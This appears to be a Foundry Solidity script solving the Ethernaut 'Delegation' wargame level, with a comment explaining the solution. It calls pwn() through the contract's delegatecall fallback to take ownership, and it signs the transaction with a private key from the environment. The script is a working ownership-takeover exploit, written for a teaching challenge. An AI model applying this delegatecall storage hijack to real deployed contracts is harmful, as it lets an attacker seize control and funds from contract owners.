// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Delegation.sol";

contract DelegationScript is Script {

    Delegate public delegate = Delegate(0x3F5C83a56EFFbeaC4dc20cCB3F4be10d45CDE507);

    Delegation public delegation = Delegation(0x3F5C83a56EFFbeaC4dc20cCB3F4be10d45CDE507);

    /**
     * Solution: delegatecall - Delegete's code is executed with Delegation's storage.
     * Executes code from another contract but with the storage of the colling calling account.
     * The fallback is not payable so there's not need to provide any ethers.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("1. Delagate's current owner", delegate.owner());
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("2. Delagate's new owner", delegate.owner());

        vm.stopBroadcast();
    }
}
